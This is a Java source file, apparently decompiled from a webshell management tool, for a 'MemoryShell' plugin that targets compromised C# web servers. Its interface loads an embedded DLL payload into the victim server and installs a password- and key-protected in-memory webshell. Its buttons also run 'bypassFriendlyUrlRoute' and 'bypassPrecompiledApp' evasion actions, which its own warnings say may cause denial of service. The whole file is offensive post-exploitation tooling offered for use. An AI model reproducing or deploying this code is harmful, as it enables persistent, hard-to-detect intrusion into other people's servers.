package shells.plugins.cshap;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import java.awt.Dimension;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.Arrays;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "MemoryShell",
   DisplayName = "内存Shell"
)
public class MemoryShell implements Plugin {
   private static final String[] MemoryShellTYPES = new String[]{"CSHARP_AES_BASE64"};
   private static final String CLASS_NAME = "memoryShell.Run";
   public JPanel mainPanel;
   public JTextField passwordTextField;
   public JTextField keyTextField;
   public JPanel corePanel;
   public JLabel passwordLabel;
   public JLabel memoryShellTypeLabel;
   public JComboBox memoryShellTypeComboBox;
   public JButton addMemoryShellButton;
   public JButton bypassFriendlyUrlRouteButton;
   public JButton bypassPrecompiledAppButton;
   public ShellEntity shellEntity;
   public Payload payload;
   public boolean load;

   public MemoryShell() {
      this.$$$setupUI$$$();
      Arrays.stream(MemoryShellTYPES).forEach((type) -> {
         this.memoryShellTypeComboBox.addItem(type);
      });
   }

   private boolean load() {
      try {
         if (!this.load) {
            this.load = this.payload.include("memoryShell.Run", functions.readInputStreamAutoClose(MemoryShell.class.getResourceAsStream(String.format("assets/memoryShell.dll"))));
         }
      } catch (Exception var4) {
         var4.printStackTrace();
         ByteArrayOutputStream stream = new ByteArrayOutputStream();
         PrintStream printStream = new PrintStream(stream);
         var4.printStackTrace(printStream);
         printStream.flush();
         printStream.close();
         JOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), new String(stream.toByteArray()));
      }

      return this.load;
   }

   private void addMemoryShellButtonClick(ActionEvent actionEvent) {
      if (this.load()) {
         String password = this.passwordTextField.getText().trim();
         String key = this.keyTextField.getText().trim();
         if (password.isEmpty() || key.isEmpty()) {
            GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "密码或密钥是空的");
            return;
         }

         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("password", password);
         reqParameter.add("key", functions.md5(key).substring(0, 16));
         reqParameter.add("action", "addShell");
         String result = new String(this.payload.evalFunc("memoryShell.Run", "addShell", reqParameter));
         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
      } else {
         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "插件加载失败");
      }

   }

   private void bypassFriendlyUrlRouteButtonClick(ActionEvent actionEvent) {
      if (this.load()) {
         int flag = GOptionPane.showConfirmDialog(UiFunction.getParentWindow(this.mainPanel), "如果你不知道这个功能是做什么的请不要点击! 这可能会引起拒绝服务!");
         if (flag != 0) {
            return;
         }

         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("action", "bypassFriendlyUrlRoute");
         String result = new String(this.payload.evalFunc("memoryShell.Run", "bypassFriendlyUrlRoute", reqParameter));
         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
      } else {
         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "插件加载失败");
      }

   }

   private void bypassPrecompiledAppButtonClick(ActionEvent actionEvent) {
      if (this.load()) {
         int flag = GOptionPane.showConfirmDialog(UiFunction.getParentWindow(this.mainPanel), "如果你不知道这个功能是做什么的请不要点击! 这可能会引起拒绝服务!");
         if (flag != 0) {
            return;
         }

         ReqParameter reqParameter = new ReqParameter();
         reqParameter.add("action", "bypassPrecompiledApp");
         String result = new String(this.payload.evalFunc("memoryShell.Run", "bypassPrecompiledApp", reqParameter));
         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
      } else {
         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "插件加载失败");
      }

   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = shellEntity.getPayloadModule();
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.mainPanel;
   }

   private void $$$setupUI$$$() {
      this.mainPanel = new JPanel();
      this.mainPanel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1, true, true));
      this.corePanel = new JPanel();
      this.corePanel.setLayout(new GridLayoutManager(6, 2, new Insets(0, 0, 0, 0), -1, -1));
      this.mainPanel.add(this.corePanel, new GridConstraints(0, 0, 1, 1, 0, 0, 3, 3, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.passwordLabel = new JLabel();
      this.passwordLabel.setText("密码:");
      this.corePanel.add(this.passwordLabel, new GridConstraints(0, 0, 1, 1, 8, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.passwordTextField = new JTextField();
      this.passwordTextField.setText("pass");
      this.corePanel.add(this.passwordTextField, new GridConstraints(0, 1, 1, 1, 8, 1, 4, 0, (Dimension)null, new Dimension(150, -1), (Dimension)null, 0, false));
      JLabel label1 = new JLabel();
      label1.setText("密钥:");
      this.corePanel.add(label1, new GridConstraints(1, 0, 1, 1, 8, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.keyTextField = new JTextField();
      this.keyTextField.setText("key");
      this.corePanel.add(this.keyTextField, new GridConstraints(1, 1, 1, 1, 0, 1, 4, 0, (Dimension)null, new Dimension(150, -1), (Dimension)null, 0, false));
      this.memoryShellTypeLabel = new JLabel();
      this.memoryShellTypeLabel.setText("Shell类型");
      this.corePanel.add(this.memoryShellTypeLabel, new GridConstraints(2, 0, 1, 1, 8, 0, 0, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.memoryShellTypeComboBox = new JComboBox();
      this.corePanel.add(this.memoryShellTypeComboBox, new GridConstraints(2, 1, 1, 1, 8, 1, 2, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.addMemoryShellButton = new JButton();
      this.addMemoryShellButton.setText("添加内存Shell");
      this.corePanel.add(this.addMemoryShellButton, new GridConstraints(5, 0, 1, 2, 0, 1, 3, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.bypassFriendlyUrlRouteButton = new JButton();
      this.bypassFriendlyUrlRouteButton.setText("bypassFriendlyUrlRoute");
      this.corePanel.add(this.bypassFriendlyUrlRouteButton, new GridConstraints(3, 0, 1, 2, 0, 1, 3, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
      this.bypassPrecompiledAppButton = new JButton();
      this.bypassPrecompiledAppButton.setText("bypassPrecompiledApp");
      this.corePanel.add(this.bypassPrecompiledAppButton, new GridConstraints(4, 0, 1, 2, 0, 1, 3, 0, (Dimension)null, (Dimension)null, (Dimension)null, 0, false));
   }

   public JComponent $$$getRootComponent$$$() {
      return this.mainPanel;
   }
}
